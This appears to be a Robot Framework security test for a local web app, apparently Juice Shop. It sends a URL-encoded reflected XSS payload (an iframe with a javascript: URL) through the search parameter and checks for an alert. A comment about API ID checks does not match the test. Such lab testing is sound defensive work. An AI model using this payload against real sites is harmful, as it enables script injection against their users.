*** Settings ***
Documentation    Automated Reflected XSS Attack via Malicious Link.
Library          SeleniumLibrary

*** Variables ***
${URL}           http://localhost:3000/
${BROWSER}       headlesschrome
# URL-encode the payload just like a browser would in a real phishing link
${XSS_LINK}      http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert('XSS%20Hack%20Successful!')%22%3E

*** Test Cases ***
# To see if the API blindly trusts the ID numbers sent in a web request without double-checking who is actually logged in.
Reflected XSS via Phishing Link
    [Documentation]    Simulate a victim clicking a malicious link containing the XSS payload.
    Open Browser    ${URL}    ${BROWSER}
    Set Window Size    1920    1080
    
    # 1. Dismiss the annoying popups
    Wait Until Element Is Visible    css=button[aria-label="Close Welcome Banner"]    timeout=5s
    Click Button                     css=button[aria-label="Close Welcome Banner"]
    Wait Until Element Is Visible    css=a[aria-label="dismiss cookie message"]    timeout=5s
    Click Element                    css=a[aria-label="dismiss cookie message"]
    
    # 2. Simulate the victim clicking the hacker's link
    Go To    ${XSS_LINK}
    
    # 3. THE PROOF: Verify the browser executed the script upon loading the page
    Alert Should Be Present    text=XSS Hack Successful!    timeout=5s
    
    Close Browser